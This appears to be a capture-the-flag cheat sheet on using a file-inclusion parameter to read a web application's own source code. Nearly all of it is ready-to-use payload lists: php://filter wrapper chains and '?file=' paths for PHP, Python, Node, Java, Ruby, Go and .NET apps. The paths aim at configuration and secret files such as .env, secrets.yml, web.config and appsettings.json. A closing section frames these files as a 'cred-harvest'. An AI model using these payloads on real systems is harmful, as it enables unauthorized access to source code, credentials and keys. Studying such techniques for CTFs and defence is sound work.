# Source-Code Read — extracting the app's own source

## The goal — source names the flag-path

The app's source is the flag-path's map — `config.py`/`main.py`/
`server.js`/`index.php`/`app.py`/`wsgi.py`/`routes.rb`/`web.xml`/
`web.config`/`appsettings.json` — the source names where the flag
actually lives.

## The `php://filter` b64-read — the PHP source-dump

```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=config.php
?file=php://filter/convert.base64-encode/resource=/var/www/html/index.php
```

The `php://filter` + `convert.base64-encode` — the PHP source is
base64-dumped — decode to read — the binary-safe source-read.

## The `php://filter` variants — the transform-chains

```
?file=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
?file=php://filter/convert.iconv.utf-8.utf-7/resource=index.php
?file=php://filter/convert.iconv.utf-8.iso-8859-1/resource=index.php
?file=php://filter/convert.iconv.utf-8.cs_ISO-2022-KR/resource=index.php
?file=php://filter/string.rot13/resource=index.php
?file=php://filter/zlib.deflate/convert.base64-encode/resource=index.php
?file=php://filter/convert.quoted-printable-encode/resource=index.php
?file=php://filter/convert.uuencode/resource=index.php
?file=php://filter/convert.base64-decode/resource=index.php    — garbage in
```

The `php://filter` transform-family — `iconv`/`rot13`/`zlib`/`qp`/`uu`/
`b64` — each a different output-encoding — `php-wrappers.md`.

## The Python source-read — `open`/`Path.read`

```
?file=/app/main.py
?file=/app/app.py
?file=/app/server.py
?file=/app/wsgi.py
?file=/app/config.py
?file=/app/settings.py
?file=/app/routes.py
?file=/app/__init__.py
?file=/app/requirements.txt
?file=/app/.env
```

## The Node source-read — `fs.readFile`/`require`

```
?file=/app/server.js
?file=/app/index.js
?file=/app/app.js
?file=/app/main.js
?file=/app/package.json
?file=/app/package-lock.json
?file=/app/.env
```

`require` execs — `fs.readFile` reads — the Node source-read.

## The Java source-read — `/WEB-INF/` corpus

```
?file=/app/WEB-INF/web.xml
?file=/app/WEB-INF/applicationContext.xml
?file=/app/WEB-INF/classes/application.properties
?file=/app/WEB-INF/classes/application.yml
?file=/app/WEB-INF/classes/config.yml
?file=/app/WEB-INF/classes/*.properties
?file=/app/WEB-INF/classes/META-INF/persistence.xml
?file=/app/WEB-INF/lib/*.jar
?file=/app/WEB-INF/classes/logback.xml
?file=/app/WEB-INF/classes/log4j*.xml
?file=/app/WEB-INF/weblogic.xml
?file=/app/WEB-INF/jboss-web.xml
?file=/app/WEB-INF/struts-config.xml
?file=/app/WEB-INF/spring*.xml
?file=/app/WEB-INF/faces-config.xml
?file=/app/WEB-INF/beans.xml
?file=/app/WEB-INF/decorators.xml
?file=/app/WEB-INF/glassfish-web.xml
jar:file:///app.war!/WEB-INF/web.xml
jar:file:///app.jar!/BOOT-INF/classes/application.properties
```

## The Ruby source-read — `File.read`/`IO.read`

```
?file=/app/config/routes.rb
?file=/app/config/database.yml
?file=/app/config/secrets.yml
?file=/app/config/application.rb
?file=/app/config/environment.rb
?file=/app/config/environments/production.rb
?file=/app/config/initializers/*.rb
?file=/app/Gemfile
?file=/app/Gemfile.lock
?file=/app/.env
?file=/app/app/controllers/*.rb
?file=/app/app/models/*.rb
```

## The Go source-read — `os.ReadFile`/`os.Open`

```
?file=/app/main.go
?file=/app/go.mod
?file=/app/go.sum
?file=/app/config.yaml
?file=/app/.env
```

## The .NET source-read — `File.Read*`/`MapPath`/`WriteFile`

```
?file=/app/web.config
?file=/app/appsettings.json
?file=/app/appsettings.Production.json
?file=/app/appsettings.Development.json
?file=/app/*.dll
?file=/app/bin/*.dll
?file=C:\inetpub\wwwroot\web.config
?file=C:\inetpub\wwwroot\appsettings.json
?file=C:\inetpub\wwwroot\bin\*.dll
```

## The "the source imports the next file" — the include-chain

`index.php → require 'config.php' → require '/opt/secret/db.php'` —
each source-read names the next — the include-chain is the read-
navigation engine — `source-location.md`.

## The "the source has the creds" — the cred-harvest

`config.php`/`database.yml`/`secrets.yml`/`.env`/`wp-config.php`/
`application.properties`/`appsettings.json`/`web.config`/`settings.py`/
`local_settings.py`/`config.yaml`/`config.yml`/`config.json` —
`secrets-and-keys.md` — the cred-corpus.

## The "the source has the flag-path" — the flag-path-map

`define('FLAG', 'flag{...}')`/`FLAG = 'flag{...}'`/`const FLAG`/
`flag_path = '/opt/flag'`/`flagFile = "/app/flag"` — the flag-path
literal in source — `flag-paths.md`.
